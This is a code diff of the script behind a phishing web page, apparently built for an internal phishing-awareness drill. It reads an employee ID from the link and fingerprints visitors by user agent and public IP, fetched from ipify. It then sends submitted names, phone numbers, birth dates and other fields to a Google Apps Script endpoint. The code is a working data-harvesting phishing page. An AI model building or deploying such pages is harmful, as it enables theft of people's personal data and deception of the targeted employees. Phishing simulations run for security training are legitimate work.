@@ -214,33 +214,71 @@
 
 <script>
     // 您的 Web App 網址
-    const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbz3Xzz5S47h8BjSwpUoBsFOFtAPd6k23WMzgUPhodaX6utFQjLdLg0Gmai_qqyVQ7HJ/exec"; // <-- 【重要】請務必換成您自己的網址！
-
+    const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbz3Xzz5S47h8BjSwpUoBsFOFtAPd6k23WMzgUPhodaX6utFQjLdLg0Gmai_qqyVQ7HJ/exec";
+    
     // 從釣魚連結的 URL 中取得員工編號
     const urlParams = new URLSearchParams(window.location.search);
     const userId = urlParams.get('userId') || 'UnknownUser';
-
+    
     // 將 navigator.userAgent 進行編碼，以避免特殊字元問題
     const userAgent = encodeURIComponent(navigator.userAgent);
 
-    // 1. 頁面載入時，記錄「連結點擊」事件 (使用 GET)
+    /**
+     * 獲取用戶的公網 IP 地址
+     * @returns {Promise<string>} - 返回 IP 地址或一個錯誤訊息
+     */
+    async function getIpAddress() {
+        try {
+            const response = await fetch('https://api.ipify.org?format=json');
+            if (!response.ok) return 'IP查詢失敗';
+            const data = await response.json();
+            return data.ip;
+        } catch (error) {
+            console.error('Error fetching IP:', error);
+            return '無法取得IP';
+        }
+    }
+
+    /**
+     * 發送事件記錄到 Google Apps Script
+     * @param {string} eventType - 事件的類型, e.g., 'Link_Clicked' or 'Data_Submitted'
+     * @param {object|null} formData - 包含表單資料的物件，如果不是提交事件則為 null
+     */
+    async function logEvent(eventType, formData = null) {
+        const ipAddress = await getIpAddress();
+        let url = `${SCRIPT_URL}?userId=${userId}&eventType=${eventType}&userAgent=${userAgent}&ipAddress=${ipAddress}`;
+        
+        const fetchOptions = {
+            method: 'GET',
+            mode: 'no-cors' // 對於 GET 請求，no-cors 也可以防止瀏覽器報錯
+        };
+
+        if (eventType === 'Data_Submitted' && formData) {
+            fetchOptions.method = 'POST';
+            fetchOptions.headers = { 'Content-Type': 'application/json' };
+            fetchOptions.body = JSON.stringify(formData);
+        }
+
+        fetch(url, fetchOptions).catch(error => console.error('Error logging event:', error));
+    }
+
+    // 1. 頁面載入時，記錄「連結點擊」事件
     document.addEventListener('DOMContentLoaded', () => {
-        fetch(`${SCRIPT_URL}?userId=${userId}&eventType=Link_Clicked&userAgent=${userAgent}`);
+        logEvent('Link_Clicked');
     });
 
     // 動態設定截止日期
     document.getElementById('deadline').innerText = '2025年8月31日 23:59';
 
-    // 2. 處理表單提交 (使用 POST)
+    // 2. 處理表單提交
     const form = document.getElementById('phishing-form');
     form.addEventListener('submit', function(event) {
-        event.preventDefault(); // 阻止表單的預設提交行為
+        event.preventDefault();
 
         const submitButton = document.getElementById('submit-button');
         submitButton.innerText = '資料驗證中，請稍候...';
         submitButton.disabled = true;
 
-        // 收集表單中的所有資料
         const formData = {
             name: document.getElementById('full-name').value,
             phone: document.getElementById('phone-number').value,
@@ -248,18 +286,10 @@
             birthDate: document.getElementById('birth-date').value
         };
 
-        // 使用 POST 方法，將表單資料打包成 JSON 字串放在 body 中發送
-        fetch(`${SCRIPT_URL}?userId=${userId}&userAgent=${userAgent}`, {
-            method: 'POST',
-            mode: 'no-cors', // 使用 no-cors 模式，因為 Apps Script 不會回傳 CORS headers
-            cache: 'no-cache',
-            headers: {
-                'Content-Type': 'application/json'
-            },
-            body: JSON.stringify(formData)
-        });
+        // 調用統一的事件記錄函式來處理提交
+        logEvent('Data_Submitted', formData);
 
-        // 為了演練效果，無論後端是否成功，前端都顯示成功畫面
+        // 顯示成功畫面
         setTimeout(() => {
             document.getElementById('main-container').innerHTML = `
                 <div style="text-align:center; padding: 40px 0;">
